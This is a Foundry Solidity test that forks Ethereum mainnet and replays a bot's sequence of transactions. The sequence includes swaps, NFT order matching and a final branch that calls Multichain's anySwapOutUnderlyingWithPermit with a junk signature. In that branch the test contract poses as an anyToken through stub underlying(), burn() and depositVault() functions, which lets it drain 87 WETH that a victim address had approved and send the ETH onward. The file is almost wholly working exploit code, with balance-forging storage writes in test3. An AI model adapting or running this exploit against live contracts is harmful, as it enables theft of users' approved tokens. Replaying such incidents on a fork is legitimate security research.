// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
}

// https://explorer.phalcon.xyz/tx/eth/0x192e2f19ab497f93ed32b2ed205c4b2ff628c82e2f236b26bec081ac361be47f
// https://etherscan.io/address/0xFDe0d1575Ed8E06FBf36256bcdfA1F359281455A

struct S8 {
    S9 p1;
    uint120 p2;
    uint120 p3;
    bytes p4;
    bytes p5;
}

struct S13 {
    S14[] p1;
    S14[] p2;
}

struct S9 {
    address p1;
    address p2;
    S10[] p3;
    S11[] p4;
    uint8 p5;
    uint256 p6;
    uint256 p7;
    bytes32 p8;
    uint256 p9;
    bytes32 p10;
    uint256 p11;
}

struct S15 {
    address p1;
    address p2;
    uint128 p3;
    uint128 p4;
    uint128 p5;
    address p6;
    address p7;
    address p8;
    address p9;
    bytes32 p10;
    uint64 p11;
    uint256 p12;
}

struct S2 {
    address p1;
    bool p2;
    address p3;
    bool p4;
}

struct S5 {
    address p1;
    uint256 p2;
    uint256 p3;
    address p4;
    address p5;
    address p6;
    uint256 p7;
    uint256 p8;
    uint8 p9;
    uint256 p10;
    uint256 p11;
    bytes32 p12;
    uint256 p13;
    bytes32 p14;
    bytes32 p15;
    uint256 p16;
    S6[] p17;
    bytes p18;
}

struct S1 {
    bytes32 p1;
    uint8 p2;
    address p3;
    address p4;
    uint256 p5;
    bytes p6;
}

struct S6 {
    uint256 p1;
    address p2;
}

struct S4 {
    uint256 p1;
    address p2;
    address p3;
    address p4;
    address p5;
    address p6;
    uint256 p7;
    uint256 p8;
    uint256 p9;
    bytes p10;
}

struct S14 {
    uint256 p1;
    uint256 p2;
}

struct S12 {
    uint256 p1;
    uint8 p2;
    uint256 p3;
    uint256 p4;
    bytes32[] p5;
}

struct S7 {
    uint8 p1;
    address p2;
    address p3;
    address p4;
    uint256 p5;
    uint256 p6;
}

struct S3 {
    uint8 p1;
    address p2;
    address p3;
    uint256 p4;
    bytes32 p5;
    uint256 p6;
    address p7;
    address p8;
    bytes p9;
}

struct S10 {
    uint8 p1;
    address p2;
    uint256 p3;
    uint256 p4;
    uint256 p5;
}

struct S11 {
    uint8 p1;
    address p2;
    uint256 p3;
    uint256 p4;
    uint256 p5;
    address p6;
}

struct S16 {
    uint8 p1;
    uint8 p2;
    bytes32 p3;
    bytes32 p4;
}

interface I {
    function balanceOf(address) external payable returns (uint256);
    function approve(address, uint256) external payable;
    function swap(uint256, uint256, address, bytes memory) external payable;
    function withdraw(uint256) external payable;
    function fillOrder(S4 memory, bytes memory, bytes memory, uint256, uint256, uint256) external payable;
    function matchAdvancedOrders(S8[] memory, S12[] memory, S13[] memory) external payable;
    function exchange(int128, int128, uint256, uint256) external payable;
    function swap(address, bool, int256, uint160, bytes memory) external payable;
    function deposit() external payable;
    function fulfillBasicOrder(S5 memory) external payable;
    function setApprovalForAll(address, bool) external payable;
    function anySwapOutUnderlyingWithPermit(
        address,
        address,
        address,
        uint256,
        uint256,
        uint8,
        bytes32,
        bytes32,
        uint256
    ) external payable;
    function getReserves() external payable returns (uint112, uint112, uint32);
    function exchange(uint256, uint256, uint256, uint256) external payable;
    function fillLimitOrder(S15 memory, S16 memory, uint128) external payable;
    function refundETH() external payable;
    function swap(S1 memory, S2 memory, uint256, uint256) external payable;
    function transfer(address, uint256) external payable;
}

contract Xd050 is Test {
    address immutable r = address(this);
    receive() external payable {}

    function setUp() public pure {
        console2.log("0x192e2f19ab497f93ed32b2ed205c4b2ff628c82e2f236b26bec081ac361be47f");
    }

    address constant x0000 = 0x0000000000000000000000000000000000000000;
    address constant x004c = 0x004C00500000aD104D7DBd00e3ae0A5C00560C00;
    address constant x0cfb = 0x0Cfb5d82BE2b949e8fa73A656dF91821E2aD99FD;
    address constant x0f31 = 0x0f3159811670c117c372428D4E69AC32325e4D0F;
    address constant x1111 = 0x1111111254EEB25477B68fb85Ed929f73A960582;
    address constant x1474 = 0x0000000147481883C318b657000001c4BA122222;
    address constant x15ff = 0x000000015FFfD05eC7E460000000000000000000;
    address constant x1e00 = 0x1E0049783F008A0085193E00003D00cd54003c71;
    address constant x1e4e = 0x1E4EDE388cbc9F4b5c79681B7f94d36a11ABEBC9;
    address constant x397f = 0x397FF1542f962076d0BFE58eA045FfA2d347ACa0;
    address constant x6033 = 0x6033368e4a402605294c91CF5c03d72bd96E7D8D;
    address constant x636f = 0x000000000000000000636F6e736F6c652e6c6f67;
    address constant x63a4 = 0x63A4086fB207c761341C30c376E9D45DF5dDB534;
    address constant x68b3 = 0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45;
    address constant x690b = 0x690B9A9E9aa1C9dB991C7721a92d351Db4FaC990;
    address constant x6b7a = 0x6b7a87899490EcE95443e979cA9485CBE7E71522;
    address constant x6c38 = 0x00000000006c3852cbEf3e08E8dF289169EdE581;
    address constant x6f73 = 0x6f73F92cf0C920E645Af34B0e4501911c42A718a;
    address constant x7803 = 0x78034d32CfAfA9dE383d4Ed642382feF3C3Bc688;
    address constant x838a = 0x838af967537350D2C44ABB8c010E49E32673ab94;
    address constant x839e = 0x839E6b96482B79a015a410d2029493D5128263a6;
    address constant x9522 = 0x95222290DD7278Aa3Ddd389Cc1E1d165CC4BAfe5;
    address constant x9ae3 = 0x9aE380F0272E2162340a5bB646c354271c0F5cFC;
    address constant x9b85 = 0x9b858Be6E3047D88820f439B240deaC2418a2551;
    address constant xa0b8 = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant xa26b = 0x0000a26b00c1F0DF003000390027140000fAa719;
    address constant xa4e8 = 0xA4E88414Aa7A8d858012Fcba1aAcc04d43d06577;
    address constant xac97 = 0xac979BFE175A31cf7deF1e966122A615D1Ccc29d;
    address constant xae78 = 0xae78736Cd615f374D3085123A210448E74Fc6393;
    address constant xb4e1 = 0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc;
    address constant xba12 = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address constant xbd3a = 0xbd3Afb0bB76683eCb4225F9DBc91f998713C3b01;
    address constant xc02a = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant xcd94 = 0xCD946eb4Ed08f2765dDD3d4f8d2ed6e381956A6d;
    address constant xd335 = 0xD33526068D116cE69F19A9ee46F0bd304F21A51f;
    address constant xdef1 = 0xDef1C0ded9bec7F1a1670819833240f027b25EfF;
    address constant xe423 = 0xe42318eA3b998e8355a3Da364EB9D48eC725Eb45;
    address constant xe8b0 = 0xe8B0CE81e206e537FEa0c90e085311b72cc7ec04;

    uint256 t_uniswapV3SwapCallback = 0;
    uint256 t_yoink = 0;

    function test1() public {
        vm.createSelectFork("http://localhost:18545", 16631555); // tx.blockNumber - 1
        // vm.createSelectFork("http://localhost:18545", bytes32(0x8ac4d2eb709133792b8326e784883980784e2cc990a2104e2ad05b542a72335c));

        // https://explorer.phalcon.xyz/tx/eth/0x8ac4d2eb709133792b8326e784883980784e2cc990a2104e2ad05b542a72335c
        this.x8ac4d2eb();
        // https://explorer.phalcon.xyz/tx/eth/0x4bc9552b0a1376302077ab9f5a6c9e068df8ec6ec7326d6c79b85e637e67ee3f
        this.x4bc9552b();
        // https://explorer.phalcon.xyz/tx/eth/0x9a8a2dfe6535b42369aa69c69caaa9e2f9433b9c5189deaf82496d16ba5450b8
        this.x9a8a2dfe();
        // https://explorer.phalcon.xyz/tx/eth/0x696901e1c31f943adf03ce1c5498bb0acc6afac514e49409d2ef90d95b468b18
        this.x696901e1();
        // https://explorer.phalcon.xyz/tx/eth/0xcf43f081f31aa944eec5195afdc845c3d4b590baa4549134e26310ba9630245a
        this.xcf43f081();
        // https://explorer.phalcon.xyz/tx/eth/0x53d0d86ae910138ef407bf3580e172109fc46921fc3ed4ea789b76a7b8db79f8
        this.x53d0d86a();
        // https://explorer.phalcon.xyz/tx/eth/0xd9d7bd7cf2614d40430390c23b067ab71413d55b36a748bd3e3a479aca68a2f6
        this.xd9d7bd7c();
        // https://explorer.phalcon.xyz/tx/eth/0xbd553fcdbad47af96058ce6b10480839f9ec1ee61cec4945d2677019bc1ba8ba
        this.xbd553fcd();
        // https://explorer.phalcon.xyz/tx/eth/0xea4b70bf185b16c8c7ad7c6b85447fb60c7354002214ec7f94e73ed2a36e6a99
        this.xea4b70bf();
        // https://explorer.phalcon.xyz/tx/eth/0x192e2f19ab497f93ed32b2ed205c4b2ff628c82e2f236b26bec081ac361be47f
        this.yoink{value: 803}();
    }

    function test2() public {
        vm.createSelectFork("http://localhost:18545", 16629451); // tx.blockNumber - 1
        // https://explorer.phalcon.xyz/tx/eth/0x8ac4d2eb709133792b8326e784883980784e2cc990a2104e2ad05b542a72335c
        this.x8ac4d2eb();
        vm.warp(1676411579);
        vm.roll(16629789);
        // https://explorer.phalcon.xyz/tx/eth/0x4bc9552b0a1376302077ab9f5a6c9e068df8ec6ec7326d6c79b85e637e67ee3f
        this.x4bc9552b();
        vm.warp(1676411627);
        vm.roll(16629793);
        // https://explorer.phalcon.xyz/tx/eth/0x9a8a2dfe6535b42369aa69c69caaa9e2f9433b9c5189deaf82496d16ba5450b8
        this.x9a8a2dfe();
        vm.warp(1676419475);
        vm.roll(16630444);
        // https://explorer.phalcon.xyz/tx/eth/0x696901e1c31f943adf03ce1c5498bb0acc6afac514e49409d2ef90d95b468b18
        this.x696901e1();
        vm.warp(1676421911);
        vm.roll(16630646);
        // https://explorer.phalcon.xyz/tx/eth/0xcf43f081f31aa944eec5195afdc845c3d4b590baa4549134e26310ba9630245a
        this.xcf43f081();
        vm.warp(1676424023);
        vm.roll(16630822);
        // https://explorer.phalcon.xyz/tx/eth/0x53d0d86ae910138ef407bf3580e172109fc46921fc3ed4ea789b76a7b8db79f8
        this.x53d0d86a();
        vm.warp(1676424095);
        vm.roll(16630828);
        // https://explorer.phalcon.xyz/tx/eth/0xd9d7bd7cf2614d40430390c23b067ab71413d55b36a748bd3e3a479aca68a2f6
        this.xd9d7bd7c();
        vm.warp(1676424107);
        vm.roll(16630829);
        // https://explorer.phalcon.xyz/tx/eth/0xbd553fcdbad47af96058ce6b10480839f9ec1ee61cec4945d2677019bc1ba8ba
        this.xbd553fcd();
        vm.warp(1676427911);
        vm.roll(16631146);
        // https://explorer.phalcon.xyz/tx/eth/0xea4b70bf185b16c8c7ad7c6b85447fb60c7354002214ec7f94e73ed2a36e6a99
        this.xea4b70bf();
        vm.warp(1676432855);
        vm.roll(16631555);
        // https://explorer.phalcon.xyz/tx/eth/0x192e2f19ab497f93ed32b2ed205c4b2ff628c82e2f236b26bec081ac361be47f
        this.yoink{value: 803}();
    }

    function test3() public {
        vm.createSelectFork("http://localhost:18545", 16631555); // tx.blockNumber - 1

        address RECEIVER = address(this);
        vm.warp(1676432855);
        vm.roll(16631556);
        vm.deal(RECEIVER, 10 ether);
        {
            address token = address(0x1E4EDE388cbc9F4b5c79681B7f94d36a11ABEBC9);
            uint256 target = 1000000000000000000000000;
            uint256 snap = vm.snapshotState();
            bool found = false;
            uint256 foundSlot = type(uint256).max;
            for (uint256 slot = 0; slot < 100; slot++) {
                vm.revertToState(snap);
                vm.store(token, keccak256(abi.encode(RECEIVER, uint256(slot))), bytes32(uint256(target)));
                uint256 bal = IERC20(token).balanceOf(RECEIVER);
                if (bal != target) continue;
                found = true;
                foundSlot = slot;
                break;
            }
            if (!found) {
                vm.revertToState(snap);
            } else {
                emit log_named_address("GF_SLOT_CACHE_TOKEN", token);
                emit log_named_uint("GF_SLOT_CACHE_SLOT", foundSlot);
                emit log_named_uint("GF_SLOT_CACHE_IS_VYPER", 0);
                vm.revertToState(snap);
                vm.store(token, keccak256(abi.encode(RECEIVER, uint256(foundSlot))), bytes32(uint256(target)));
                require(IERC20(token).balanceOf(RECEIVER) == target, "GF: final store failed");
            }
        }
        {
            address token = address(0x9aE380F0272E2162340a5bB646c354271c0F5cFC);
            uint256 target = 1000000000000000000000000;
            uint256 snap = vm.snapshotState();
            bool found = false;
            uint256 foundSlot = type(uint256).max;
            for (uint256 slot = 0; slot < 100; slot++) {
                vm.revertToState(snap);
                vm.store(token, keccak256(abi.encode(RECEIVER, uint256(slot))), bytes32(uint256(target)));
                uint256 bal = IERC20(token).balanceOf(RECEIVER);
                if (bal != target) continue;
                found = true;
                foundSlot = slot;
                break;
            }
            if (!found) {
                vm.revertToState(snap);
            } else {
                emit log_named_address("GF_SLOT_CACHE_TOKEN", token);
                emit log_named_uint("GF_SLOT_CACHE_SLOT", foundSlot);
                emit log_named_uint("GF_SLOT_CACHE_IS_VYPER", 0);
                vm.revertToState(snap);
                vm.store(token, keccak256(abi.encode(RECEIVER, uint256(foundSlot))), bytes32(uint256(target)));
                require(IERC20(token).balanceOf(RECEIVER) == target, "GF: final store failed");
            }
        }
        vm.store(
            address(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48),
            keccak256(abi.encode(RECEIVER, uint256(9))),
            bytes32(uint256(1000000000000000000000000))
        );
        vm.store(
            address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2),
            keccak256(abi.encode(RECEIVER, uint256(3))),
            bytes32(uint256(1000000000000000000000000))
        );
        // https://explorer.phalcon.xyz/tx/eth/0x192e2f19ab497f93ed32b2ed205c4b2ff628c82e2f236b26bec081ac361be47f
        this.yoink{value: 803}();
    }

    function x696901e1() public {
        Xd050(payable(r)).yoink{value: 711}();
    }

    function xea4b70bf() public {
        Xd050(payable(r)).yoink{value: 637}();
    }

    function xbd553fcd() public {
        address(tx.origin).call("");
    }

    function x9a8a2dfe() public {
        Xd050(payable(r)).yoink{value: 131}();
    }

    function x8ac4d2eb() public {
        Xd050(payable(r)).yoink{value: 677}();
    }

    function x4bc9552b() public {
        address(tx.origin).call("");
    }

    function x53d0d86a() public {
        Xd050(payable(r)).yoink{value: 775}();
    }

    function xd9d7bd7c() public {
        address(tx.origin).call("");
    }

    function xcf43f081() public {
        Xd050(payable(r)).yoink{value: 823}();
    }

    function yoink() public payable {
        t_yoink++;

        if (t_yoink == 1) {
            I(xc02a).approve(x0f31, type(uint256).max);

            bytes memory b01 = abi.encode(
                hex"000000840f3159811670c117c372428d4e69ac32325e4d0f3df0212400000000",
                0,
                4294967296,
                108938498531919972438204481536,
                101288756637969340022634053764,
                hex"0f3159811670c117c372428d4e69ac32325e4d0f5b41b9080000000000000000",
                0,
                18446744073709551616,
                x15ff,
                x1474,
                hex"22228d8ba445958a75a0704d566bf2c852bbbe29000000000000000000000000",
                17747108403195211620953844875264,
                hex"d050e0a4838d74769228b49dff97241b4ef3805d000000000000000000000000",
                0,
                hex"e42318ea3b998e8355a3da364eb9d48ec725eb45000000000000000000000000",
                0,
                hex"0000000000000000000000310fe52dbd8f93d3d5000000000000000000000000",
                132818685775803689168845140539167561733,
                hex"84806aadd2dd0b8b000200000000000000000367000000000000000000000000",
                0,
                hex"ae78736cd615f374d3085123a210448e74fc6393000000000000000000000000d33526068d116ce69f19a9ee46f0bd304f21a51f00000000000000000000000000000000000000000000000147481883c318b657000000000000000000000000",
                15211807202738752817960438464512,
                788
            );
            I(xe423).swap(r, false, 905035831584184587221, 1461446703485210103287273052203988822378723970341, b01);

            // uint256 v1 = 252199422045205604;
            uint256 v1 = I(xc02a).balanceOf(r);
            console2.log("I(xc02a).balanceOf(r)\t\t->", "252199422045205604 (0.2521 ether)");
            I(xc02a).withdraw(252199422045205603);
            x9522.call{value: 170739008724604193}("");
            return;
        }
        if (t_yoink == 2) {
            // uint112 v1 = 17678018261273162508107472;
            // uint112 v2 = 1673612406168888791776;
            // uint32 v3 = 1676411591;
            (uint112 v1, uint112 v2, uint32 v3) = I(x6033).getReserves();
            console2.log("I(x6033).getReserves()\t->", v1, v2, v3);
            I(xc02a).deposit{value: 475379933790583805}();
            I(xc02a).transfer(x6033, 475379933790583805);
            I(x6033).swap(5004857590098744616092, 0, r, "");

            bytes memory b03 =
                hex"bf15fcd8000000000000000000000000303389f541ff2d620e42832f180a08e767b28e10000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000000242cc2878d0063f2a19100000000000000839e6b96482b79a015a410d2029493d5128263a600000000000000000000000000000000000000000000000000000000";
            S4 memory s401 = S4(
                1024224987639,
                xa0b8,
                x1e4e,
                x839e,
                x0000,
                x0000,
                700000000,
                4300000000000000000000,
                4421431254442149611168492388118363282642987198110904030635476664713216,
                b03
            );
            bytes memory b04 =
                hex"dc44bc7f5d0471b1f69b97157215997c53aeb4c1e6b54aea922d03d9e99e563322860842e6f3286c84ef5b6805037fd86acb9ebbf033cd215e73344b2f43bc72";
            I(x1111)
                .fillOrder(
                    s401,
                    b04,
                    "",
                    0,
                    1401360125227648492505,
                    57896044618658097711785492504343953926634992332820282019728792003956790667076
                );

            I(x1e4e).approve(x1111, 3603497464871096123587);

            bytes memory b05 =
                hex"bf15fcd8000000000000000000000000303389f541ff2d620e42832f180a08e767b28e10000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000000242cc2878d006405eb2600000000000000ac979bfe175a31cf7def1e966122a615d1ccc29d00000000000000000000000000000000000000000000000000000000";
            S4 memory s402 = S4(
                377178332390,
                xa0b8,
                x1e4e,
                xac97,
                x0000,
                x0000,
                11000000000,
                69620253164556950000000,
                4421431254442149611168492388118363282642987198110904030635476664713216,
                b05
            );
            bytes memory b06 =
                hex"45e4abf553a40f8dee6ab64fd7095ab50058bf84f991d6a287f85d11b8efbf1c2ab47776dfdf9a56b8c4035fafe0420723840523675a834e422756ea45794b5c";
            I(x1111)
                .fillOrder(
                    s402,
                    b06,
                    "",
                    0,
                    3603497464871096123587,
                    57896044618658097711785492504343953926634992332820282019728792003957128479041
                );

            // uint256 v4 = 797480992;
            uint256 v4 = I(xa0b8).balanceOf(r);
            console2.log("I(xa0b8).balanceOf(r)\t\t->", uint256(797480992));
            I(xa0b8).transfer(xb4e1, 797480991);
            // uint256 v5 = 43298507151489;
            uint256 v5 = I(xa0b8).balanceOf(xb4e1);
            console2.log("I(xa0b8).balanceOf(xb4e1)\t->", uint256(43298507151489));
            // uint112 v6 = 43297709670498;
            // uint112 v7 = 27850435132691421857038;
            // uint32 v8 = 1676411615;
            (uint112 v6, uint112 v7, uint32 v8) = I(xb4e1).getReserves();
            console2.log("I(xb4e1).getReserves()\t->", v6, v7, v8);
            I(xb4e1).swap(0, 511416321528874177, r, "");
            I(xc02a).withdraw(511416321528874177);
            x690b.call{value: 4720766793716038}("");
            return;
        }
        if (t_yoink == 3) {
            I(xc02a).deposit{value: 4849465769994420713}();
            I(x838a).exchange(0, 1, 4849465769994420713, 0);
            I(xc02a).approve(x838a, 0);

            bytes memory b07 = abi.encode(
                hex"000000449ae380f0272e2162340a5bb646c354271c0f5cfca9059cbb000000000000000000000000e8b0ce81e206e537fea0c90e085311b72cc7ec0400000000",
                3262317583816663267035964244060
            );
            I(xe8b0).swap(r, true, 759567502843370490483, 4295128740, b07);

            // uint256 v1 = 4970023032024999988;
            uint256 v1 = I(xc02a).balanceOf(r);
            console2.log("I(xc02a).balanceOf(r)\t\t->", "4970023032024999988 (4.9700 ether)");
            I(xc02a).withdraw(4970023032024999987);
            x690b.call{value: 85716213303741863}("");
            return;
        }
        if (t_yoink == 4) {
            I(x0cfb).setApprovalForAll(x1e00, true);

            S6 memory s601 = S6(6742500000000000, xa26b);
            S6 memory s602 = S6(13485000000000000, x6f73);
            S6[] memory arr01 = new S6[](2);
            arr01[0] = s601;
            arr01[1] = s602;
            S5 memory s501 = S5(
                x0000,
                0,
                249472500000000000,
                xcd94,
                x004c,
                x0cfb,
                281492156581211,
                1,
                2,
                1676421413,
                1678837013,
                0x0000000000000000000000000000000000000000000000000000000000000000,
                24446860302761739304752683030156737591518664810215442929808650754453367176835,
                0x0000007b02230091a7ed01230072f7006a004d60a8d4e71d599b8104250f0000,
                0x0000007b02230091a7ed01230072f7006a004d60a8d4e71d599b8104250f0000,
                2,
                arr01,
                hex"fe6c1666f52c732e9f7aa0659e9bfff53410de2df23ec5af2f08d34062ff70a13868713667b67960c15b0f5c7e269bad813ef290cf12aea45bc09003b7ee0d391b"
            );
            I(x6c38).fulfillBasicOrder{value: 269700000000000000}(s501);

            S10 memory s1001 = S10(1, xc02a, 0, 1060220000000000000, 1060220000000000000);
            S10[] memory arr04 = new S10[](1);
            arr04[0] = s1001;
            S11 memory s1101 = S11(
                4, x0cfb, 114381250139746129434641625620228959843266449665587071575353563853582195388442, 1, 1, xa4e8
            );
            S11 memory s1102 = S11(1, xc02a, 0, 26505500000000000, 26505500000000000, xa26b);
            S11 memory s1103 = S11(1, xc02a, 0, 53011000000000000, 53011000000000000, x6f73);
            S11[] memory arr05 = new S11[](3);
            arr05[0] = s1101;
            arr05[1] = s1102;
            arr05[2] = s1103;
            S9 memory s901 = S9(
                xa4e8,
                x004c,
                arr04,
                arr05,
                2,
                1676421292,
                1676422192,
                0x3000000000000000000000000000000000000000000000000000000000000000,
                15251935821555538636,
                0x0000007b02230091a7ed01230072f7006a004d60a8d4e71d599b8104250f0000,
                3
            );
            bytes memory b09 =
                hex"282a7e80564cffb5c1c9e562d4145fa1a504f5d742e8bd6f5406433fdfb49a027a41ffd5b28b4d7a5a932c26ba2b7179911ff0e86823ffd4910177518981b380";
            S8 memory s801 = S8(s901, 1, 1, b09, "");
            S10 memory s1002 = S10(2, x0cfb, 281492156581211, 1, 1);
            S10[] memory arr06 = new S10[](1);
            arr06[0] = s1002;
            S11 memory s1104 = S11(1, xc02a, 0, 980703500000000000, 980703500000000000, r);
            S11[] memory arr07 = new S11[](1);
            arr07[0] = s1104;
            S9 memory s902 = S9(
                r,
                x0000,
                arr06,
                arr07,
                0,
                1676421292,
                1676422192,
                0x0000000000000000000000000000000000000000000000000000000000000000,
                24446860302761739304752683030156737591518664810215442929814640919082599566978,
                0x0000007b02230091a7ed01230072f7006a004d60a8d4e71d599b8104250f0000,
                1
            );
            S8 memory s802 = S8(s902, 1, 1, "", "");
            S8[] memory arr03 = new S8[](2);
            arr03[0] = s801;
            arr03[1] = s802;
            bytes32[] memory arr09 = new bytes32[](14);
            arr09[0] = 0xa5cce83a77a0a0f3fd5f7491383992259ddfe3c6ddf3cb6010addde8de8974dc;
            arr09[1] = 0x40e5ede68ea380ee64b4f3fe384a4d77fb00ee0debb9b7593db915c6e389aaa4;
            arr09[2] = 0x6d66092dfd8c4b6b7b3814cac67a4b09e0dbbded6916165c4ac42fdc00c9b698;
            arr09[3] = 0xc2d6a6bfca7c63454bf62ede12e7582e21e6b853efd18054fff47176111ee401;
            arr09[4] = 0xa5a477c968286bedac86429745dc3f7afe68a5bfdb697b7f785413fe2ef9d1a7;
            arr09[5] = 0xbbbfea497aeb08415932fd86cce9d67ba4d2903413ff5ec928828f5d153a7391;
            arr09[6] = 0x9787deddc86342763111f905e22fba74f75163926e2b2956dcbf5a263750ce7f;
            arr09[7] = 0x60f5a78af3c89abf91b6be5069bb9488cd0d236bafa40d6c7e998bd2f7bad471;
            arr09[8] = 0x25c3ccf81642b8313708eefe8e750307d1e3436c78dca5120e3a3f943fd9c4f0;
            arr09[9] = 0xbdbeb03b5d344fde700971e62ed92fedbe756b6547978c32f8e1ac7d798c7ac7;
            arr09[10] = 0x6ccd425d69780a39bed4305edcce06bbc77841bbe542c4a5510a3cb66131b734;
            arr09[11] = 0x4f5f09276b71bd4240cad8672ef9dbbc2ed56927f1930dceeda2ba532954cb02;
            arr09[12] = 0x74864547795314c7a7bd913da8643be0cb3f79ed28e9a0de66ba6114f82d1f1e;
            arr09[13] = 0x9b6ad423cbed87b063bb538b62f8d8c1862055f5620ee78a63c8a350a47ef6cd;
            S12 memory s1201 = S12(0, 1, 0, 281492156581211, arr09);
            S12[] memory arr08 = new S12[](1);
            arr08[0] = s1201;
            S14 memory s1401 = S14(1, 0);
            S14[] memory arr11 = new S14[](1);
            arr11[0] = s1401;
            S14 memory s1402 = S14(0, 0);
            S14[] memory arr12 = new S14[](1);
            arr12[0] = s1402;
            S13 memory s1301 = S13(arr11, arr12);
            S14 memory s1403 = S14(0, 0);
            S14[] memory arr13 = new S14[](1);
            arr13[0] = s1403;
            S14 memory s1404 = S14(0, 1);
            S14[] memory arr14 = new S14[](1);
            arr14[0] = s1404;
            S13 memory s1302 = S13(arr13, arr14);
            S14 memory s1405 = S14(0, 0);
            S14[] memory arr15 = new S14[](1);
            arr15[0] = s1405;
            S14 memory s1406 = S14(0, 2);
            S14[] memory arr16 = new S14[](1);
            arr16[0] = s1406;
            S13 memory s1303 = S13(arr15, arr16);
            S14 memory s1407 = S14(0, 0);
            S14[] memory arr17 = new S14[](1);
            arr17[0] = s1407;
            S14 memory s1408 = S14(1, 0);
            S14[] memory arr18 = new S14[](1);
            arr18[0] = s1408;
            S13 memory s1304 = S13(arr17, arr18);
            S13[] memory arr10 = new S13[](4);
            arr10[0] = s1301;
            arr10[1] = s1302;
            arr10[2] = s1303;
            arr10[3] = s1304;
            I(x6c38).matchAdvancedOrders(arr03, arr08, arr10);

            // uint256 v1 = 980703500000000001;
            uint256 v1 = I(xc02a).balanceOf(r);
            console2.log("I(xc02a).balanceOf(r)\t\t->", "980703500000000001 (0.9807 ether)");
            I(xc02a).withdraw(980703500000000000);
            xbd3a.call{value: 585155880500000000}("");
            return;
        }
        if (t_yoink == 5) {
            I(x68b3).refundETH();
            x690b.call{value: 11771361262722583}("");
            return;
        }
        if (t_yoink == 6) {
            I(x1e4e).approve(xdef1, type(uint256).max);
            // uint112 v1 = 18234712654366861511994060;
            // uint112 v2 = 1626719655108595054143;
            // uint32 v3 = 1676427911;
            (uint112 v1, uint112 v2, uint32 v3) = I(x6033).getReserves();
            console2.log("I(x6033).getReserves()\t->", v1, v2, v3);
            I(xc02a).deposit{value: 6356612746428888064}();
            I(xc02a).transfer(x6033, 6356612746428888064);
            I(x6033).swap(70764988517181208672624, 0, r, "");

            S15 memory s1501 = S15(
                xa0b8,
                x1e4e,
                10000000000,
                70921985800000000000000,
                0,
                x7803,
                x0000,
                x0000,
                x9b85,
                0x0000000000000000000000000000000000000000000000000000000000000000,
                1677025016,
                1676420216
            );
            S16 memory s1601 = S16(
                2,
                28,
                0xbd43f35641ef72d08e9f2d6892bba0971b5b5053da398d2f1a61a686f0330e6d,
                0x58adb5b86f99655ac2e30408418e224c57cb99cf4f2b49082ddc681112275701
            );
            I(xdef1).fillLimitOrder(s1501, s1601, 70764988517181208672624);

            // uint256 v4 = 9977863384;
            uint256 v4 = I(xa0b8).balanceOf(r);
            console2.log("I(xa0b8).balanceOf(r)\t\t->", uint256(9977863384));
            I(xa0b8).transfer(x397f, 9977863383);
            // uint256 v5 = 24645848202041;
            uint256 v5 = I(xa0b8).balanceOf(x397f);
            console2.log("I(xa0b8).balanceOf(x397f)\t->", uint256(24645848202041));
            // uint112 v6 = 24635870338658;
            // uint112 v7 = 15900298160716278453396;
            // uint32 v8 = 1676427623;
            (uint112 v6, uint112 v7, uint32 v8) = I(x397f).getReserves();
            console2.log("I(x397f).getReserves()\t->", v6, v7, v8);
            I(x397f).swap(0, 6417926484132342367, r, "");
            I(xc02a).withdraw(6417926484132342367);
            x690b.call{value: 39056850917100391}("");
            return;
        }
        if (t_yoink == 7) {
            I(x6b7a)
                .anySwapOutUnderlyingWithPermit(
                    x63a4,
                    r,
                    r,
                    87000000000000000000,
                    100000000000000000000,
                    0,
                    0x3078000000000000000000000000000000000000000000000000000000000000,
                    0x3078000000000000000000000000000000000000000000000000000000000000,
                    56
                );
            I(xc02a).withdraw(87000000000000000000);
            x690b.call{value: 69861000000000000000}("");
            return;
        }
    }

    function burn(address, uint256) public {
        bytes memory rt = hex"0000000000000000000000000000000000000000000000000000000000000001";
        assembly {
            return(add(rt, 0x20), mload(rt))
        }
    }

    function uniswapV3SwapCallback(int256, int256, bytes memory) public {
        t_uniswapV3SwapCallback++;

        if (t_uniswapV3SwapCallback == 1) {
            I(x0f31).exchange(0, 1, 25364220731873058816, 23583126402918561367);
            I(x0f31).exchange(0, 1, 25364220731873058816, 23583126402918561367);

            S1 memory s101 = S1(
                0x0fd5663d4893ae0d579d580584806aadd2dd0b8b000200000000000000000367,
                0,
                xae78,
                xd335,
                23583126402918561367,
                ""
            );
            S2 memory s201 = S2(r, false, xe423, false);
            I(xba12).swap(s101, s201, 905035831584184587221, 1676407499);

            return;
        }
        if (t_uniswapV3SwapCallback == 2) {
            I(x9ae3).transfer(xe8b0, 759567502843370490483);
            return;
        }
    }

    function underlying() public {
        bytes memory rt = abi.encodePacked(abi.encode(address(xc02a)));
        assembly {
            return(add(rt, 0x20), mload(rt))
        }
    }

    function call() public payable {}

    function depositVault(uint256, address) public {
        bytes memory rt = hex"0000000000000000000000000000000000000000000000000000000000000001";
        assembly {
            return(add(rt, 0x20), mload(rt))
        }
    }

    fallback() external payable {
        revert("no such function");
    }
}
